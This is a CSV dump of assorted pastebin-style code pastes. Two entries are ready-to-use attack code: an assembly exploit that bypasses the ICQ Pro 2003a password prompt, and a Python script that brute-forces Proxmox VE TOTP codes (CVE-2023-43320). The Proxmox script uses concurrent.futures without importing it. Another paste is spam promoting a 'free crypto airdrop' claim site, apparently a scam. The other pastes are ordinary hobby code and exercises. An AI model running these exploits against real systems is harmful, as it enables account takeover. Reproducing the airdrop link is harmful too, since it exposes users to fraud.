id,title,username,language,date,content
U3F64v9E,ICQ Pro 2003a - 'ca1-icq.asm' Password Bypass,FlyFar,MPASM,Friday 2nd of February 2024 05:28:05 AM CDT,"; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      BOF 
; -------------------------------------------------------------------------
;
;  07/02/2003 - ca1-icq.asm 
;  ICQ Password Bypass exploit.
;  written by Caua Moura Prado (aka ca1)
; 
;  This exploit allows you to login to ICQ server using any account registered *locally*
;  no matter the 'save password' option is checked or not. High level security is also bypassed. 
;  All you have to do is run the exploit and set status property using your mouse when the flower
;  is yellow. If you accidentally set status to offline then you will need to restart ICQ and run 
;  the exploit again. 
;
;        uh-oh!
;         ___     
;      __/   \__  
;     /  \___/  \        Vulnerable:
;     \__/+ +\__/          ICQ Pro 2003a Build #3800
;     /   ~~~   \
;     \__/   \__/        Not Vulnerable:
;        \___/                ICQ Lite alpha Build 1211
;                               ICQ 2001b and ICQ 2002a 
;    tHe Flaw Power       All other versions were not tested.                       
;                                                      
                           coded with masm32
; ________________________________________________________________exploit born in .br
        
.386
.model flat, stdcall
option casemap:none
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib
.data
szTextHigh byte 'Password Verification', 0 
szTextLow byte 'Login to server', 0
szClassName byte '#32770', 0
.data?
hWndLogin dword ?
.code
_entrypoint:
 invoke FindWindow, addr szClassName, addr szTextHigh
 mov hWndLogin, eax  
 .if hWndLogin == 0
   invoke FindWindow, addr szClassName, addr szTextLow
   mov hWndLogin, eax
 .endif 
 invoke GetParent, hWndLogin 
 invoke EnableWindow, eax, 1      ;Enable ICQ contact 
list
 invoke ShowWindow, hWndLogin, 0  ;get rid of Login 
screen (don't kill this window)
 invoke ExitProcess, 0            ;uhuu.. cya! i gotta 
sleep!
end _entrypoint

; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      EOF 
; -------------------------------------------------------------------------



; milw0rm.com [2003-07-09]
            "
qRdAAeqE,Proxmox VE - TOTP Brute Force - CVE-2023-43320,FlyFar,Python,Friday 2nd of February 2024 05:20:21 AM CDT,"# Exploit Title: Proxmox VE TOTP Brute Force
# Date: 09/23/2023
# Exploit Author: Cory Cline, Gabe Rust
# Vendor Homepage: https://www.proxmox.com/en/
# Software Link: http://download.proxmox.com/iso/
# Version: 5.4 - 7.4-1
# Tested on: Debian
# CVE : CVE-2023-43320

import time
import requests
import urllib.parse
import json
import os
import urllib3

urllib3.disable_warnings()
threads=25

#################### REPLACE THESE VALUES #########################
password=""KNOWN PASSWORD HERE""
username=""KNOWN USERNAME HERE""
target_url=""https://HOST:PORT""
##################################################################

ticket=""""
ticket_username=""""
CSRFPreventionToken=""""
ticket_data={}

auto_refresh_time = 20 # in minutes - 30 minutes before expiration
last_refresh_time = 0

tokens = [];

for num in range(0,1000000):
    tokens.append(str(num).zfill(6))

def refresh_ticket(target_url, username, password):
    global CSRFPreventionToken
    global ticket_username
    global ticket_data
    refresh_ticket_url = target_url + ""/api2/extjs/access/ticket""
    refresh_ticket_cookies = {}
    refresh_ticket_headers = {}
    refresh_ticket_data = {""username"": username, ""password"": password, ""realm"": ""pve"", ""new-format"": ""1""}
    ticket_data_raw = urllib.parse.unquote(requests.post(refresh_ticket_url, headers=refresh_ticket_headers, cookies=refresh_ticket_cookies, data=refresh_ticket_data, verify=False).text)
    ticket_data = json.loads(ticket_data_raw)
    CSRFPreventionToken = ticket_data[""data""][""CSRFPreventionToken""]
    ticket_username = ticket_data[""data""][""username""]

def attack(token):
    global last_refresh_time
    global auto_refresh_time
    global target_url
    global username
    global password
    global ticket_username
    global ticket_data
    if ( int(time.time()) > (last_refresh_time + (auto_refresh_time * 60)) ):
        refresh_ticket(target_url, username, password)
        last_refresh_time = int(time.time())

    url = target_url + ""/api2/extjs/access/ticket""
    cookies = {}
    headers = {""Csrfpreventiontoken"": CSRFPreventionToken}
    stage_1_ticket = str(json.dumps(ticket_data[""data""][""ticket""]))[1:-1]
    stage_2_ticket = stage_1_ticket.replace('\\""totp\\"":', '\""totp\""%3A').replace('\\""recovery\\"":', '\""recovery\""%3A')
    data = {""username"": ticket_username, ""tfa-challenge"": stage_2_ticket, ""password"": ""totp:"" + str(token)}
    response = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
    if(len(response.text) > 350):
        print(response.text)
        os._exit(1)

while(1):
    refresh_ticket(target_url, username, password)
    last_refresh_time = int(time.time())

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        res = [executor.submit(attack, token) for token in tokens]
        concurrent.futures.wait(res)
            "
a2bRvZGw,List of all FREE Crypto Airdrops!,jusst2k4,GetText,Friday 2nd of February 2024 05:05:13 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://claim-netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://claim-netdrop.netlify.app/

448271"
jbwkwwgy,snake game for ezr6502 v1,Kitomas,6502 ACME Cross Assembler,Friday 2nd of February 2024 04:49:19 AM CDT,"r16al = $f0
r16ah = r16al + 1
r16bl = r16al + 2
r16bh = r16al + 3
r16a  = r16al
r16b  = r16bl
swap   = $fd
random = $fe
key    = $ff 

;background color is always black (0)
FRUIT_COLOR = 14 ;red
SNAKE_COLOR = 13 ;green




!macro if_eq .end {  bne .end }


;update the screen before waiting a frame
!macro flip_screen { nop }


!macro phall { ;push a,x,y onto stack
  pha
  txa
  pha
  tya
  pha
}

!macro plall { ;pull y,x,a onto stack
  pla
  tay
  pla
  tax
  pla
}


!macro ldxy_abs .address {
  ldx .address
  ldy .address + 1
}

!macro stxy_abs .address {
  stx .address
  sty .address + 1
}




*=$600


init:
  jsr snake_reset
loop:
  jsr snake_keypress
  jsr snake_move
  
  +flip_screen ;wait 4 frames
  +flip_screen
  +flip_screen
  +flip_screen

  jmp loop




equal16ab: ;ignores N flag
  lda r16ah
  cmp r16bh
  bne .highByteNotEqual
  lda r16al
  cmp r16bl
.highByteNotEqual:
  ;(Z and C should be already set)
  rts
  
  
  
;add accumulator to r16a
add8_16a:
  pha ;preserve accumulator
  clc
  adc r16al
  sta r16al
  bcc .noInc
  ;increment high byte if low byte overflows
  inc r16ah
.noInc:
  pla ;restore accumulator
  rts



;get screen address from x,y (in coordinates)
 ;resulting address is returned into x,y
 ;(the result will be $200 + (y&31)*32 + x&31)
get_screen_address:
  pha       ;preserve accumulator
  
  lda #0    ;set r16a to (y%32)*32 (AKA (y&31)<<5 )
  sta r16ah  ;^^
  tya        ;^^
  and #31    ;^^
  asl        ;^^shift accumulator left
  rol r16ah  ;^^rotate left into the high byte
  asl        ;^^
  rol r16ah  ;^^
  asl        ;^^
  rol r16ah  ;^^
  asl        ;^^
  rol r16ah  ;^^
  asl        ;^^
  rol r16ah  ;^^
  sta r16al  ;^^finally, store the low byte
  
  txa          ;r16a += x
  jsr add8_16a  ;^^

  ldx r16al ;load address into x,y
  ldy r16ah  ;^^
  iny        ;^^(address must be += by $200
  iny        ;^^ so increment high byte twice)
 
  pla       ;restore accumulator
  
  rts 




snake_reset:
  ;reset registers
  lda #0
  tax
  ;tay
  
  ;reset single values
  ;sta fruit_addr
  ;sta fruit_addr + 1 ;+1 for MSB
  ;sta snake_dir
  ;sta snake_x
  ;sta snake_y
  ;^^ the above is all set later on anyway
  sta snake_length
  sta snake_first
  sta snake_last
  
.wipeLoop0: ;set stuff to 0
  sta $00,x ;wipe zeropage
  ;(stack is not wiped)
  sta $200,x ;wipe screen
  sta $300,x  ;^^
  sta $400,x  ;^^
  sta $500,x  ;^^
  sta snake_buffer,x ;wipe snake buffer
  inx
 bne .wipeLoop0 ;breaks when x overflows
  
  ;add initial snake segment
  lda random             ;random snake direction
  and #3                  ;^^
  sta snake_dir           ;^^
  ldx random             ;random snake position
  ldy random              ;^^
  +stxy_abs snake_pos     ;^^
  
  jsr get_screen_address ;add (invisible) fruit for baby snake
  +stxy_abs fruit_addr    ;^^to eat when it is born
  
  +ldxy_abs snake_pos    ;the gift of life
  jsr snake_new           ;^^
  ;(a new fruit is created automatically by snake_new!)
  
  lda #0   ;reset registers (again)
  tax       ;^^
  tay       ;^^
  
  ;clear flags
  clc : cli : clv : cld
  
  rts




;enqueue an address from x,y
snake_enqueue:
  +phall             ;preserve registers
  
  txa                ;store low byte of address
  ldx snake_last      ;^^
  sta snake_buffer,x  ;^^
  
  tya                ;store high byte of address
  inx                 ;^^
  sta snake_buffer,x  ;^^
  
  inx                ;snake_last += 2
  stx snake_last      ;^^(+2 because of the 2 inx)
  inc snake_length   ;increase snake length by 1
  
  +plall             ;restore registers
  
  rts


;dequeue an address into x,y
snake_dequeue:
  pha                ;preserve accumulator
  
  ldx snake_first    ;store low byte to swap temporarily
  lda snake_buffer,x  ;^^
  sta swap            ;^^
  inx                 ;^^
  
  lda snake_buffer,x ;load high byte into y
  tay                 ;^^
  inx                 ;^^
  
  stx snake_first    ;snake_first += 2
  ldx swap           ;load low byte into x
  dec snake_length   ;decrease snake length by 1
  
  pla                ;restore accumulator
  
  rts 




;set a to boolean of if address x,y has snake segment
 ;(really, it's just checking if the byte = SNAKE_COLOR)
snake_check:
  stx r16al        ;store address for indirection
  sty r16ah         ;^^
  
  ldy #0           ;load value from address
  lda (r16al),y     ;^^
  ldy r16ah        ;restore y

  cmp #SNAKE_COLOR ;branch if byte == SNAKE_COLOR
  beq .true         ;^^

.false:
  lda #0
  rts
.true:
  lda #1
  rts 
  



snake_death_effect:
  +phall    ;preserve registers
  
  ldy #0    ;set r16a to $200
  lda #2     ;^^
  sty r16al  ;^^
  sta r16ah  ;^^

  ldx #4 ;screen is 4 pages long (1024B)
.loopRandom:
  lda random     ;put random color onto screen
  sta (r16al),y   ;^^
  tya            ;flip screen if y&31 == 31
  and #31         ;^^
  cmp #31         ;^^
  bne .no_blit0   ;^^
    +flip_screen  ;^^
  :.no_blit0:
  iny             ;increment y, breaking 1st loop
  bne .loopRandom  ;^^if y overflows back to 0
  inc r16ah       ;increment page and decrement x,
  dex              ;^^
  bne .loopRandom  ;^^breaking 2nd loop if x overflows
  
  lda #2    ;set r16a back to $200
  sty r16al  ;^^(y=0 currently)
  sta r16ah  ;^^
  ldx #4    ;set up x for 4 pages again
.loopBlack: ;same thing, except the color is always black
  lda #0
  sta (r16al),y
  tya
  and #31
  cmp #31
  bne .no_blit1
    +flip_screen
  :.no_blit1:
  iny
  bne .loopBlack
  inc r16ah
  dex
  bne .loopBlack
  
  ldy #45
.waitLoop: ;wait for about 3/4 a second
  +flip_screen
  dey
  bne .waitLoop

  +plall ;restore registers
  
  rts 
  



key_w = $77 ;3 = north
key_a = $61 ;2 = west
key_s = $73 ;1 = south
key_d = $64 ;0 = east
;change snake direction based on wasd keys
snake_keypress:
  +phall       ;preserve registers
  
  lda key      ;load last key pressed
  ora #%100000  ;^^will always be lowercase if bit 5 is set
  ldx snake_dir ;for preventing north/south or east/west flips
  
  cmp #key_d
  bne not_d
  cpx #2
  beq not_d
    lda #0
    sta snake_dir
  :not_d:
  
  cmp #key_s
  bne not_s
  cpx #3
  beq not_s
    lda #1
    sta snake_dir
  :not_s:
  
  cmp #key_a
  bne not_a
  cpx #0
  beq not_a
    lda #2
    sta snake_dir
  :not_a:
  
  cmp #key_w
  bne not_w
  cpx #1
  beq not_w
    lda #3
    sta snake_dir
  :not_w:
  
  lda #0  ;reset key to null
  sta key  ;^^
  
  +plall ;restore registers
  rts 
  



;create new fruit, at random screen position
 ;(while avoiding the snake)
 ;(also, the previous fruit is not removed here,
 ; since it's overwritten when the snake passes over it!)
fruit_new:
  +phall ;preserve registers
  
.reroll:
  ;load random address on-screen
  lda random      ;get random number from 0 -> 1023
  ldx random       ;^^
  and #%11         ;^^get only lowest 2 bits from high byte
  eor #%11         ;^^(this eor is here for reasons)
  tay              ;^^
  iny             ;make sure it starts at $200
  iny              ;^^
  
  jsr snake_check ;'does that pixel contain a snake segment?'
  cmp #1          ;if true is returned, then reroll for a new spot
  beq .reroll      ;^^
  
  +stxy_abs fruit_addr ;put new location of fruit into fruit_addr
  +stxy_abs r16a       ;put the fruit on-screen
  lda #FRUIT_COLOR      ;^^
  ldy #0                ;^^
  sta (r16a),y          ;^^
  
  +plall ;restore registers
  
  rts



;create new snake segment, at snake's head position (using x,y)
 ;(if snake_ate == 1, then don't dequeue)
snake_new:
  +phall ;preserve registers
  
  jsr get_screen_address ;convert position to address
  jsr snake_enqueue      ;put new segment onto the queue
  +stxy_abs r16a         ;put new segment onto the screen
  lda #SNAKE_COLOR        ;^^
  ldy #0                  ;^^
  sta (r16a),y            ;^^
  
  +ldxy_abs fruit_addr   ;if fruit was just hit, don't remove tail
  +stxy_abs r16b          ;^^
  jsr equal16ab           ;^^
  beq .dontDequeue        ;^^
    jsr snake_dequeue    ;otherwise, remove the tail segment
    +stxy_abs r16a        ;^^
    lda #0                ;^^
    tay                   ;^^
    sta (r16a),y          ;^^
    jmp .dontCreateFruit ;skip call to fruit_new
.dontDequeue:
  jsr fruit_new
.dontCreateFruit:
  
  +plall ;restore registers
  
  rts 
  



;move the snake in its current direction
snake_move:
  +phall ;preserve registers
  
  ;not experienced enough to make a jump table, sooo...
  clv ;clear overflow flag, so i can have a reliable branch
  lda snake_dir
  cmp #0 ;0 = east
  +if_eq .eif0_A
    inc snake_x
    bvc .eif0
  :.eif0_A:
  cmp #1 ;1 = south
  +if_eq .eif0_B
    inc snake_y
    bvc .eif0
  :.eif0_B:
  cmp #2 ;2 = west
  +if_eq .eif0_C
    dec snake_x
    bvc .eif0
  :.eif0_C:
  cmp #3 ;3 = north
  +if_eq .eif0_D
    dec snake_y
    bvc .eif0
  :.eif0_D:
  :.eif0:
  
  lda snake_x ;load x and y % 32
  and #31      ;^^
  tax          ;^^
  lda snake_y  ;^^
  and #31      ;^^
  tay          ;^^
  stx snake_x ;x and y %=32
  sty snake_y  ;^^
  
  jsr get_screen_address
  jsr snake_check
  cmp #1
  bne .notASnakeSegment
  jsr snake_death_effect
  jmp $600
.notASnakeSegment:

  +ldxy_abs snake_pos ;create segment from new position
  jsr snake_new        ;^^
  
  +plall ;restore registers
  rts 
  
  

;(fruit is color 14, whereas the snake is color 13)
fruit_addr  : !16 0 ;address of fruit on-screen
snake_dir   : !8 0 ;0 -> 3 (east, south, west, north)
snake_pos   : ;alias for snake_x basically
snake_x     : !8 0 ;0 -> 31
snake_y     : !8 0 ;0 -> 31
snake_length: !8 0 ;0 -> 128 (game resets at 128)
snake_first : !8 0 ;offset of first queue element's LSB
snake_last  : !8 0 ;offset of last queue element's LSB
snake_buffer: ;!fill 256 ;snake segment queue
;(there's no bounds checking for the snake queue lol)"
D5hWq2VQ,Светящийся ледяной кирпич,Sashaiolh,Lua,Friday 2nd of February 2024 04:43:58 AM CDT,"{
  label = ""Яркий ледяной кирпич"",
  lightLevel = 15,
  shapes = {
    { 0,0,0,16,16,16,texture = ""botania:customBrick2"" },
  }
}"
5MrMCpeH,Ubuntu Exercice,2t8gewjihrokhjdoe,Bash,Friday 2nd of February 2024 04:28:36 AM CDT,"cd Desktop
mkdir trabalho msdocs
cd trabalho
mkdir word excel
cd word
mkdir aluno_um aluno_dois
cd aluno_dois
touch meus_textos.dat help.txt
cd ../../excel
mkdir aluno_a aluno_b
cd aluno_a
touch meus_calculos.dat help.txt
cd ../aluno_b
touch meus_calculos.dat help.txt

cd ~
cd Desktop

mkdir -p aulalinux/xpto/imgs
mkdir -p aulalinux/xpto/jogos
mkdir -p aulalinux/fic
mkdir -p aulalinux/meus

tree

cd aulalinux/meus
nano eu.txt (Renildo Pereira)
cp eu.txt /home/renildo/Desktop/aulalinux/xpto/imgs/aluno.txt
cat /home/renildo/Desktop/aulalinux/xpto/imgs/aluno.txt
cp eu.txt /home/renildo/Desktop/aulalinux/xpto/imgs
cp aluno.txt /home/renildo/Desktop/aulalinux/meus
mv aluno.txt /home/renildo/Desktop/aulalinux/xpto/jogos
cd ../jogos
cp aluno.txt /home/renildo/Desktop/aulalinux
cp /home/renildo/Desktop/aulalinux/fic
rm * 
cd ..
rm -r jogos
cd ../..
tree"
F8v5hyAy,Play sounds with Pygame ...,DeaD_EyE,Python,Friday 2nd of February 2024 04:06:02 AM CDT,"from random import randint
from pathlib import Path
from pygame import mixer


class Player:
    def __init__(self):
        self.sounds = self._setup()
        self.channel = None

    def _setup(self):
        mixer.init()
        return [
            mixer.Sound(file)
            for file in Path(r""C:\Windows\Media"").glob(""*.wav"")
            if file.is_file()
        ]

    def __len__(self):
        return len(self.sounds)

    def stop(self):
        if self.channel is not None:
            self.channel.stop()
            self.channel = None

    def play(self, index):
        if 0 <= index < len(self):
            self.stop()
            self.channel = self.sounds[index]
            self.channel.play()


def main():
    player = Player()
    while True:
        input(""Enter to play a sound "")
        player.play(randint(0, len(player) - 1))


if __name__ == ""__main__"":
    main()
"
02QrfvMh,printWget,Sashaiolh,Lua,Friday 2nd of February 2024 03:35:39 AM CDT,"-- Get 3dprint.lua
-- os.execute(""rm 3dprint.lua"")
-- os.execute(""pastebin get 0UKaiuFb 3dprint.lua"")

-- Global variables
local shell = require(""shell"")
local args = shell.parse(...)

-- Functions
function getArgument(index)
  if ((#args > 0) and (#args >= index)) then
    return args[index]
  else
    return nil
  end
end

print(""Удаление файла..."")
os.execute(""rm model2.lua"")
print(""Скачивание файла..."")
os.execute(string.format(""wget %s model2.lua"", getArgument(1)))
print(""Начало печати..."")
os.execute(""3dprint.lua model2.lua"")"
jMJ0YB8T,Untitled,Tss_Flmzy,C++,Friday 2nd of February 2024 02:58:58 AM CDT,"#include <vector>

class HashLPTable {
private:
    std::vector<int> table;
    int size;

public:
    HashLPTable(int size) : size(size) {
        table.resize(size, -1);
    }

    int hashFunction(int key) const {
        return key % size;
    }

    void insert(int key) {
        int index = hashFunction(key);
        while (table[index] != -1) {
            index = (index + 1) % size;
        }
        table[index] = key;
    }

    bool search(int key) {
        int index = hashFunction(key);
        int start = index;
        while (table[index] != key) {
            index = (index + 1) % size;
            if (index == start) {
                return false;
            }
        }
        return true;
    }

    void remove(int key) {
        int index = hashFunction(key);
        int start = index;
        while (table[index] != key) {
            index = (index + 1) % size;
            if (index == start) {
                return;
            }
        }
        table[index] = -1;
    }
};
"
X5x9Qgvj,http requests retrier Python 2,kopyl,Python,Friday 2nd of February 2024 02:58:37 AM CDT,"import os
import sys
import time
import requests


p = print


class CurrentDatetime:

    date = time.strftime('%d %b %Y')
    time = time.strftime('%H:%M:%S')

    def __str__(self):
        return f""{self.date} {self.time}""


def get_caught_error(additional_message=""""):
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    message = (
        f""Now {CurrentDatetime()}\n""
        f""\""{fname}\"" caught an error ""
        f""{exc_type.__name__} ""
        f""on line {exc_tb.tb_lineno}:\n""
        f""\""{exc_obj}\""""
        f""\n\n{additional_message}""
    )
    return message


def define_retry_delay_seconds(
    retry_time_count: int
) -> int:

    retry_in_seconds = 1 * retry_time_count
    if retry_in_seconds > 1800:
        retry_in_seconds = 1800
    return retry_in_seconds


def retry_request_till_success(
    request: requests.models.Request
) -> requests.models.Response:

    def wrapper(*args, **kwargs):
        retry_time_count = 1
        while True:
            retry_in_seconds = define_retry_delay_seconds(retry_time_count)
            try:
                response = request(*args, **kwargs)
                if response == None:  # doc.id#13
                    p(""There is no request to retry"")
                    return

                if response.status_code in [200, 404]:
                    return response
                else:
                    p(
                        f""URL: {response.url} ""
                        f""Request in {request.__name__} failed. ""
                        f""Status_code – {response.status_code} ""
                        f""Will retry again in {retry_in_seconds} seconds""
                    )
                    time.sleep(retry_in_seconds)
                    retry_time_count += 1

            except (
                requests.ConnectTimeout,
                requests.exceptions.ReadTimeout
            ) as e:
                error = get_caught_error()
                p(
                    f""Request in {request.__name__} failed. ""
                    f""Timed out with error {error}""
                    f""Will retry again in {retry_in_seconds} seconds""
                )
                time.sleep(retry_in_seconds)
                retry_time_count += 1
            except requests.exceptions.ConnectionError as e:
                sleep_time = 10
                p(
                    f""Request in {request.__name__} failed @""
                    f""{CurrentDatetime()}. ""
                    ""No connection to internet... ""
                    f""Will retry again in {sleep_time} seconds""
                )
                time.sleep(sleep_time)
    return wrapper"
